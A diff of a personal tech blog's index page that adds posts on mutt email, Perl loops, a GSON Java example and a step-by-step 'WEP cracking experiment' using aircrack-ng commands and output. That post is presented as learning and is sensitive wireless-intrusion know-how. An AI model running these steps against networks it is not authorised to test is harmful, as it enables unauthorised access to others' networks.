@@ -228,64 +228,8 @@ Blah...
 </pre></div>
 </div>
 </li>
-<li><p class="first">Add a logo for your site.</p>
-<p>First, copy your logo image to the <span class="docutils literal"><span class="pre">source/_static</span></span> directory.</p>
-<p>Then, edit <span class="docutils literal"><span class="pre">conf.py</span></span>:</p>
-<div class="highlight-python"><div class="highlight"><pre><span class="n">html_logo</span> <span class="o">=</span> <span class="s">"logo.jpg"</span>
-</pre></div>
-</div>
-</li>
-<li><p class="first">Modify style sheets.</p>
-<p>First, edit <span class="docutils literal"><span class="pre">conf.py</span></span> and specify your CSS file name:</p>
-<div class="highlight-python"><div class="highlight"><pre><span class="n">html_style</span> <span class="o">=</span> <span class="s">"mystyle.css"</span>
-</pre></div>
-</div>
-<p>Second, create your CSS file the <span class="docutils literal"><span class="pre">source/_static</span></span> directory:</p>
-<div class="highlight-shell-session"><div class="highlight"><pre><span class="go">$ cd source/_static</span>
-<span class="go">$ vi mystyle.css</span>
-</pre></div>
-</div>
-<p>Then, edit your CSS file by inheriting default theme CSS, <span class="docutils literal"><span class="pre">nature.css</span></span> in our example.</p>
-<div class="highlight-css"><div class="highlight"><pre><span class="k">@import</span> <span class="nt">url</span><span class="o">(</span><span class="s2">"nature.css"</span><span class="o">)</span><span class="p">;</span>
-
-<span class="nt">body</span> <span class="p">{</span>
-  <span class="k">font-family</span><span class="o">:</span> <span class="s2">"Helvetica Neue"</span><span class="o">,</span> <span class="n">Helvetica</span><span class="o">,</span> <span class="n">Arial</span><span class="o">,</span> <span class="k">sans-serif</span><span class="p">;</span>
-  <span class="k">font-size</span><span class="o">:</span> <span class="m">14px</span><span class="p">;</span>
-  <span class="k">font-weight</span><span class="o">:</span> <span class="m">300</span><span class="p">;</span>
-  <span class="k">background-color</span><span class="o">:</span><span class="m">#333</span><span class="p">;</span>
-
-<span class="p">}</span>
-
-<span class="nt">div</span><span class="nc">.sphinxsidebar</span> <span class="p">{</span>
-  <span class="k">font-size</span><span class="o">:</span> <span class="m">0.9em</span><span class="p">;</span>
-  <span class="k">line-height</span><span class="o">:</span> <span class="m">1.5em</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="nt">div</span><span class="nc">.sphinxsidebarwrapper</span><span class="p">{</span>
-  <span class="k">margin-left</span><span class="o">:</span><span class="m">10px</span><span class="p">;</span>
-  <span class="k">padding</span><span class="o">:</span> <span class="m">5px</span> <span class="m">0</span> <span class="m">10px</span> <span class="m">0</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="nt">div</span><span class="nc">.related</span> <span class="p">{</span>
-  <span class="k">background-color</span><span class="o">:</span><span class="m">#5F95CE</span><span class="p">;</span>
-  <span class="k">font-size</span><span class="o">:</span> <span class="m">1em</span><span class="p">;</span>
-<span class="p">}</span>
-</pre></div>
-</div>
-</li>
-<li><p class="first">Build your source files from <span class="docutils literal"><span class="pre">base_dir</span></span>.</p>
-<div class="highlight-shell-session"><div class="highlight"><pre><span class="go">$ make html</span>
-<span class="go">$ sphinx-build -b html -d build/doctrees source build/html</span>
-</pre></div>
-</div>
-<p>Use the following commands if your modification to CSS files does not take effect</p>
-<div class="highlight-shell-session"><div class="highlight"><pre><span class="go">$ sphinx-build -a -b html -d build/doctrees source build/html</span>
-</pre></div>
-</div>
-</li>
-<li><p class="first">Finish. HTML files are generated in <span class="docutils literal"><span class="pre">build/html</span></span>, and your site is ready to be visited.</p>
-</li>
 </ol>
+<p class="readmorewrapper"><a class="readmore" href="2013/03/19/create_a_personal_website_with_sphinx.html#more">Read more...</a></p> 
 
         <div class="postmeta">
         <div class="author">
@@ -299,6 +243,327 @@ Blah...
         </div>
         <div class="comments">
             <a href="http://blog.shichao-an.info/blog/html/2013/03/19/create_a_personal_website_with_sphinx.html#disqus_thread" data-disqus-identifier="2013/03/19/create_a_personal_website_with_sphinx">Leave a comment</a>
+        </div></div><div class="separator post_separator"></div><div class="timestamp postmeta">
+            <span>February 07, 2013</span>
+        </div>
+        <h1><a href="2013/02/07/send_mails_with_mutt_on_linux.html">Send mails with mutt on Linux</a></h1>
+<p>Given that the sendmail MTA is in use on Linux.</p>
+<p>Install mutt:</p>
+<div class="highlight-shell-session"><div class="highlight"><pre><span class="go"># yum install mutt</span>
+<span class="go"># vi ~/.muttrc</span>
+</pre></div>
+</div>
+<p>Append the following into <span class="docutils literal"><span class="pre">.muttrc</span></span>:</p>
+<div class="highlight-text"><div class="highlight"><pre>set sendmail="/usr/sbin/sendmail"
+set use_from=yes
+set realname="webmaster"
+set from=no-replay@example.com
+set envelope_from=yes
+</pre></div>
+</div>
+<p>Send email:</p>
+<div class="highlight-shell-session"><div class="highlight"><pre><span class="go"># echo "CONTENT" | mutt -s "SUBJECT" -a /path/to/attachment.zip receiver@example.com</span>
+</pre></div>
+</div>
+
+        <div class="postmeta">
+        <div class="author">
+            <span>Posted by Shichao An</span>
+        </div>
+        
+        <div class="tags">
+            <span>
+                Tags:
+                <a href="tags/linux.html">Linux</a></span>
+        </div>
+        <div class="comments">
+            <a href="http://blog.shichao-an.info/blog/html/2013/02/07/send_mails_with_mutt_on_linux.html#disqus_thread" data-disqus-identifier="2013/02/07/send_mails_with_mutt_on_linux">Leave a comment</a>
+        </div></div><div class="separator post_separator"></div><div class="timestamp postmeta">
+            <span>January 25, 2013</span>
+        </div>
+        <h1><a href="2013/01/25/loop_statements_in_perl.html">Loop statements in Perl</a></h1>
+<p>Loop statement in Perl seems to conform to the TMTOWTDI or “There’s more than one way to do it” philosophy.</p>
+<p>The contents below is copied from Chinese Wikipedia article.</p>
+<p>Define an array group and we have the following loop statements which perform the same thing:</p>
+<div class="highlight-perl"><div class="highlight"><pre><span class="nv">@group</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">..</span> <span class="mi">10</span><span class="p">;</span>
+<span class="k">for</span> <span class="p">(</span><span class="nv">@group</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">print</span> <span class="s">"$_\n"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">print</span> <span class="s">"$_\n"</span> <span class="k">for</span> <span class="nv">@group</span><span class="p">;</span>
+<span class="k">foreach</span> <span class="p">(</span><span class="nv">@group</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">print</span> <span class="s">"$_\n"</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>for, which is borrowed from C:</p>
+<div class="highlight-perl"><div class="highlight"><pre><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">print</span> <span class="s">"$group[$i]\n"</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>while:</p>
+<div class="highlight-perl"><div class="highlight"><pre><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">while</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">print</span> <span class="s">"$group[$i]\n"</span><span class="p">;</span>
+    <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>do…while:</p>
+<div class="highlight-perl"><div class="highlight"><pre><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">do</span> <span class="p">{</span>
+    <span class="k">print</span> <span class="s">"$group[$i]\n"</span><span class="p">;</span>
+    <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">);</span>
+</pre></div>
+</div>
+<p>until:</p>
+<div class="highlight-perl"><div class="highlight"><pre><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">until</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">==</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">print</span> <span class="s">"$group[$i]\n"</span><span class="p">;</span>
+    <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>do…until, borrowed from PASCAL:</p>
+<div class="highlight-perl"><div class="highlight"><pre><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">do</span> <span class="p">{</span>
+    <span class="k">print</span> <span class="s">"$group[$i]\n"</span><span class="p">;</span>
+    <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">until</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">==</span> <span class="mi">10</span><span class="p">);</span>
+</pre></div>
+</div>
+<p>map, some kind of functional:</p>
+<div class="highlight-perl"><div class="highlight"><pre><span class="nb">map</span> <span class="p">{</span> <span class="k">print</span> <span class="s">"$_\n"</span> <span class="p">}</span> <span class="nv">@group</span><span class="p">;</span>
+</pre></div>
+</div>
+
+        <div class="postmeta">
+        <div class="author">
+            <span>Posted by Shichao An</span>
+        </div>
+        
+        <div class="tags">
+            <span>
+                Tags:
+                <a href="tags/perl.html">Perl</a></span>
+        </div>
+        <div class="comments">
+            <a href="http://blog.shichao-an.info/blog/html/2013/01/25/loop_statements_in_perl.html#disqus_thread" data-disqus-identifier="2013/01/25/loop_statements_in_perl">Leave a comment</a>
+        </div></div><div class="separator post_separator"></div><div class="timestamp postmeta">
+            <span>January 24, 2013</span>
+        </div>
+        <h1><a href="2013/01/24/gson_simple_example_of_json_serialization.html">GSON simple example of JSON deserialization and use of parser</a></h1>
+<p>It seems that JSON-lib is a bit old and requires many dependencies, so I try to have a quick look at Google GSON, which has become the most popular tools for JSON in Java.</p>
+<div class="highlight-json"><div class="highlight"><pre><span class="p">{</span>
+    <span class="nt">"id"</span><span class="p">:</span> <span class="s2">"10001"</span><span class="p">,</span>
+    <span class="nt">"time"</span><span class="p">:</span> <span class="s2">"20.1"</span><span class="p">,</span>
+    <span class="nt">"result"</span><span class="p">:</span> <span class="p">[{</span>
+        <span class="nt">"name"</span><span class="p">:</span> <span class="s2">"John"</span><span class="p">,</span>
+        <span class="nt">"age"</span><span class="p">:</span> <span class="s2">"22"</span>
+        <span class="p">},{</span>
+        <span class="nt">"name"</span><span class="p">:</span> <span class="s2">"Jim"</span><span class="p">,</span>
+        <span class="nt">"age"</span><span class="p">:</span> <span class="s2">"23"</span>
+        <span class="p">},{</span>
+        <span class="nt">"name"</span><span class="p">:</span> <span class="s2">"Rachel"</span><span class="p">,</span>
+        <span class="nt">"age"</span><span class="p">:</span> <span class="s2">"21"</span>
+        <span class="p">}]</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>GsonTest.java</p>
+<div class="highlight-java"><div class="highlight"><pre><span class="kn">package</span> <span class="n">com</span><span class="o">.</span><span class="na">gson</span><span class="o">.</span><span class="na">test</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.google.gson.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.io.FileUtils</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">GsonTest</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="c1">// Deserialize JSON to object</span>
+        <span class="n">String</span> <span class="n">txt</span> <span class="o">=</span> <span class="s">"{'name': 'James', 'age': '25'}"</span><span class="o">;</span>
+        <span class="n">Gson</span> <span class="n">gson</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Gson</span><span class="o">();</span>
+        <span class="n">Person</span> <span class="n">person</span> <span class="o">=</span> <span class="n">gson</span><span class="o">.</span><span class="na">fromJson</span><span class="o">(</span><span class="n">txt</span><span class="o">,</span> <span class="n">Person</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">person</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+        <span class="cm">/*</span>
+<span class="cm">         * name: James</span>
+<span class="cm">         * age: 25</span>
+<span class="cm">         *</span>
+<span class="cm">         * */</span>
+
+        <span class="n">String</span> <span class="n">r</span> <span class="o">=</span> <span class="n">readToString</span><span class="o">(</span><span class="s">"/path/to/json.txt"</span><span class="o">);</span>
+
+        <span class="c1">// Parse JSON directly (into JsonElement)</span>
+        <span class="n">JsonParser</span> <span class="n">parser</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JsonParser</span><span class="o">();</span>
+        <span class="n">JsonObject</span> <span class="n">obj</span> <span class="o">=</span> <span class="o">(</span><span class="n">JsonObject</span><span class="o">)</span><span class="n">parser</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">r</span><span class="o">);</span>
+        <span class="n">JsonElement</span> <span class="n">id</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"id"</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">id</span><span class="o">);</span> <span class="c1">// Prints "10001"</span>
+
+        <span class="n">JsonArray</span> <span class="n">arr</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"result"</span><span class="o">).</span><span class="na">getAsJsonArray</span><span class="o">();</span>
+        <span class="n">JsonElement</span> <span class="n">p</span> <span class="o">=</span> <span class="n">arr</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">p</span><span class="o">);</span> <span class="c1">// Prints {"name": "John","age": "22"}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">readToString</span><span class="o">(</span><span class="n">String</span> <span class="n">path</span><span class="o">){</span>
+        <span class="n">File</span> <span class="n">f</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
+        <span class="k">try</span><span class="o">{</span>
+            <span class="n">String</span> <span class="n">r</span> <span class="o">=</span> <span class="n">FileUtils</span><span class="o">.</span><span class="na">readFileToString</span><span class="o">(</span><span class="n">f</span><span class="o">,</span> <span class="s">"UTF-8"</span><span class="o">);</span>
+            <span class="k">return</span> <span class="n">r</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">){</span>
+             <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+             <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+<span class="kd">class</span> <span class="nc">Person</span><span class="o">{</span>
+    <span class="kd">private</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
+    <span class="kd">private</span> <span class="n">String</span> <span class="n">age</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="nf">Person</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="n">String</span> <span class="n">age</span><span class="o">){</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">age</span> <span class="o">=</span> <span class="n">age</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="o">(){</span>
+         <span class="n">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
+         <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"name: "</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
+         <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"age: "</span> <span class="o">+</span> <span class="n">age</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
+         <span class="k">return</span> <span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+    <span class="o">}</span>
+
+<span class="o">}</span>
+</pre></div>
+</div>
+
+        <div class="postmeta">
+        <div class="author">
+            <span>Posted by Shichao An</span>
+        </div>
+        
+        <div class="tags">
+            <span>
+                Tags:
+                <a href="tags/java.html">Java</a></span>
+        </div>
+        <div class="comments">
+            <a href="http://blog.shichao-an.info/blog/html/2013/01/24/gson_simple_example_of_json_serialization.html#disqus_thread" data-disqus-identifier="2013/01/24/gson_simple_example_of_json_serialization">Leave a comment</a>
+        </div></div><div class="separator post_separator"></div><div class="timestamp postmeta">
+            <span>January 08, 2013</span>
+        </div>
+        <h1><a href="2013/01/08/wep_craking_experiment_on_ubuntu_12_10.html">WEP cracking experiment on Ubuntu 12.10</a></h1>
+<p>This experiment follows the online basic tutorials at <a class="reference external" href="http://www.aircrack-ng.org">http://www.aircrack-ng.org/</a> and is done in terms of learning.</p>
+<ol class="arabic">
+<li><p class="first">Download and install <a class="reference external" href="http://www.aircrack-ng.org">Aircrack-ng suite</a>:</p>
+<div class="highlight-shell-session"><div class="highlight"><pre><span class="go">$ sudo apt-get install aircrack-ng</span>
+</pre></div>
+</div>
+</li>
+<li><p class="first">Start the wireless card in monitor mode, discover Access Points (AP) and determine a proper target AP:</p>
+<div class="highlight-shell-session"><div class="highlight"><pre><span class="go">$ iwconfig</span>
+<span class="go">wlan0     IEEE 802.11bgn  ESSID:off/any</span>
+<span class="go">          Mode:Managed  Access Point: Not-Associated   Tx-Power=16 dBm</span>
+<span class="go">          Retry  long limit:7   RTS thr:off   Fragment thr:off</span>
+<span class="go">          Power Management:off</span>
+
+<span class="go">lo        no wireless extensions.</span>
+
+<span class="go">eth0      no wireless extensions.</span>
+
+<span class="go">$ sudo airmon-ng start wlan0</span>
+<span class="go">Interface   Chipset     Driver</span>
+
+<span class="go">wlan0       Atheros     ath9k - [phy0]</span>
+<span class="go">                (monitor mode enabled on mon0)</span>
+
+<span class="go">$ sudo airodump-ng mon0</span>
+</pre></div>
+</div>
+<p><img alt="02_1" src="_images/02_1-e1357703106181.png"/></p>
+<p>The screenshot above shows the APs on different channels. Choose a WEP target.</p>
+</li>
+<li><p class="first">Start the wireless interface with the same channel to the target AP.</p>
+<p>Assume our target AP has ESSID “TARGET-NET” and BSSID (MAC address) “C0:3F:0E:D3:XX:XX” on channel 11.</p>
+<div class="highlight-shell-session"><div class="highlight"><pre><span class="go">$ sudo airmon-ng stop wlan0</span>
+<span class="go">$ sudo airmon-ng stop mon0</span>
+<span class="go">$ sudo airmon-ng start wlan0 11</span>
+<span class="go">Interface   Chipset     Driver</span>
+
+<span class="go">wlan0       Atheros     ath9k - [phy0]</span>
+<span class="go">                (monitor mode enabled on mon0)</span>
+</pre></div>
+</div>
+</li>
+<li><p class="first">Test packet injection on the target AP.</p>
+<div class="highlight-shell-session"><div class="highlight"><pre><span class="go">$ sudo aireplay-ng -9 -e TARGET-NET -a C0:3F:0E:D3:XX:XX mon0</span>
+<span class="go">20:38:56  Waiting for beacon frame (BSSID: C0:3F:0E:D3:XX:XX) on channel 11</span>
+<span class="go">20:38:56  Trying broadcast probe requests...</span>
+<span class="go">20:38:56  Injection is working!</span>
+<span class="go">20:38:58  Found 1 AP</span>
+
+<span class="go">20:38:58  Trying directed probe requests...</span>
+<span class="go">20:38:58  C0:3F:0E:D3:XX:XX - channel: 11 - 'TARGET-NET'</span>
+<span class="go">20:39:00  Ping (min/avg/max): 1.664ms/6.917ms/39.315ms Power: -78.96</span>
+<span class="go">20:39:00  23/30:  76%</span>
+</pre></div>
+</div>
+</li>
+<li><p class="first">Capture initialization vectors (IVs).</p>
+<div class="highlight-shell-session"><div class="highlight"><pre><span class="go">$ sudo airodump-ng -c 11 --bssid C0:3F:0E:D3:XX:XX -w c mon0</span>
+</pre></div>
+</div>
+<p><img alt="04_2" src="_images/04_2.png"/></p>
+</li>
+<li><p class="first">Fake authentication with the target AP.</p>
+<p>Assume our card MAC address is “64:D5:43:80:XX:XX”.</p>
+<p>Open a new terminal and run the following command.</p>
+<div class="highlight-shell-session"><div class="highlight"><pre><span class="go">$ sudo aireplay-ng -1 0 -e TARGET-NET -a C0:3F:0E:D3:XX:XX -h 64:D5:43:80:XX:XX mon0</span>
+<span class="go">20:46:23  Waiting for beacon frame (BSSID: C0:3F:0E:D3:XX:XX) on channel 11</span>
+
+<span class="go">20:46:23  Sending Authentication Request (Open System) [ACK]</span>
+<span class="go">20:46:23  Authentication successful</span>
+<span class="go">20:46:23  Sending Association Request</span>
+
+<span class="go">20:46:28  Sending Authentication Request (Open System) [ACK]</span>
+<span class="go">20:46:28  Authentication successful</span>
+<span class="go">20:46:28  Sending Association Request [ACK]</span>
+<span class="go">20:46:28  Association successful : -) (AID: 1)</span>
+</pre></div>
+</div>
+</li>
+<li><p class="first">Start ARP request replay mode to speed up the collecting of IVs</p>
+<p>Open another terminal and run the following command.</p>
+<div class="highlight-shell-session"><div class="highlight"><pre><span class="go">$ sudo aireplay-ng -3 -b C0:3F:0E:D3:XX:XX -h 64:D5:43:80:XX:XX mon0</span>
+<span class="go">Saving ARP requests in replay_arp-0108-214535.cap</span>
+<span class="go">You should also start airodump-ng to capture replies.</span>
+<span class="go">Read 336429 packets (got 138673 ARP requests and 15355 ACKs), sent 177878 packet</span>
+</pre></div>
+</div>
+<p>After that, the “#DATA” column in the terminal capturing IVs (in Step 5) can be seen incrementing faster.</p>
+</li>
+<li><p class="first">Obtain the WEP key using aircrack-ng.</p>
+<div class="highlight-shell-session"><div class="highlight"><pre><span class="go">$ sudo aircrack-ng -b C0:3F:0E:D3:XX:XX c*.cap</span>
+</pre></div>
+</div>
+<p><img alt="01" src="_images/01-e1357703129846.png"/></p>
+<p>With 23K IVs, the WEP key is calculated in less than 20 seconds.</p>
+</li>
+</ol>
+
+        <div class="postmeta">
+        <div class="author">
+            <span>Posted by Shichao An</span>
+        </div>
+        
+        <div class="tags">
+            <span>
+                Tags:
+                <a href="tags/ubuntu.html">Ubuntu</a>, <a href="tags/linux.html">Linux</a>, <a href="tags/hacking.html">Hacking</a></span>
+        </div>
+        <div class="comments">
+            <a href="http://blog.shichao-an.info/blog/html/2013/01/08/wep_craking_experiment_on_ubuntu_12_10.html#disqus_thread" data-disqus-identifier="2013/01/08/wep_craking_experiment_on_ubuntu_12_10">Leave a comment</a>
         </div></div><div class="archive_link">
         <a href="archive.html"> &mdash; Blog Archive &mdash; </a>
     </div><ul class="related clearfix">
@@ -338,7 +603,7 @@ Blah...
     <h1>Tags Cloud</h1>
       <a href="tags/apache.html" style="font-size: 8pt">Apache</a>&nbsp;&nbsp;
       <a href="tags/aws.html" style="font-size: 8pt">AWS</a>&nbsp;&nbsp;
-      <a href="tags/bash.html" style="font-size: 14pt">Bash</a>&nbsp;&nbsp;
+      <a href="tags/bash.html" style="font-size: 13pt">Bash</a>&nbsp;&nbsp;
       <a href="tags/bsd.html" style="font-size: 9pt">BSD</a>&nbsp;&nbsp;
       <a href="tags/centos.html" style="font-size: 9pt">CentOS</a>&nbsp;&nbsp;
       <a href="tags/computer_science.html" style="font-size: 8pt">Computer Science</a>&nbsp;&nbsp;
@@ -346,16 +611,18 @@ Blah...
       <a href="tags/dns.html" style="font-size: 9pt">DNS</a>&nbsp;&nbsp;
       <a href="tags/fedora.html" style="font-size: 9pt">Fedora</a>&nbsp;&nbsp;
       <a href="tags/gdb.html" style="font-size: 8pt">GDB</a>&nbsp;&nbsp;
+      <a href="tags/hacking.html" style="font-size: 8pt">Hacking</a>&nbsp;&nbsp;
       <a href="tags/iptables.html" style="font-size: 8pt">iptables</a>&nbsp;&nbsp;
+      <a href="tags/java.html" style="font-size: 8pt">Java</a>&nbsp;&nbsp;
       <a href="tags/linux.html" style="font-size: 20pt">Linux</a>&nbsp;&nbsp;
       <a href="tags/mongodb.html" style="font-size: 8pt">MongoDB</a>&nbsp;&nbsp;
       <a href="tags/mysql.html" style="font-size: 8pt">MySQL</a>&nbsp;&nbsp;
-      <a href="tags/network.html" style="font-size: 13pt">Network</a>&nbsp;&nbsp;
-      <a href="tags/os_x.html" style="font-size: 14pt">OS X</a>&nbsp;&nbsp;
-      <a href="tags/perl.html" style="font-size: 8pt">Perl</a>&nbsp;&nbsp;
-      <a href="tags/python.html" style="font-size: 13pt">Python</a>&nbsp;&nbsp;
+      <a href="tags/network.html" style="font-size: 12pt">Network</a>&nbsp;&nbsp;
+      <a href="tags/os_x.html" style="font-size: 13pt">OS X</a>&nbsp;&nbsp;
+      <a href="tags/perl.html" style="font-size: 9pt">Perl</a>&nbsp;&nbsp;
+      <a href="tags/python.html" style="font-size: 12pt">Python</a>&nbsp;&nbsp;
       <a href="tags/sphinx.html" style="font-size: 8pt">Sphinx</a>&nbsp;&nbsp;
-      <a href="tags/ubuntu.html" style="font-size: 8pt">Ubuntu</a>&nbsp;&nbsp;
+      <a href="tags/ubuntu.html" style="font-size: 9pt">Ubuntu</a>&nbsp;&nbsp;
       <a href="tags/unix.html" style="font-size: 8pt">Unix</a>&nbsp;&nbsp;
       <a href="tags/vim.html" style="font-size: 8pt">Vim</a>
 </div></section></aside></div> <!-- #main --></div> <!-- #main-container -->
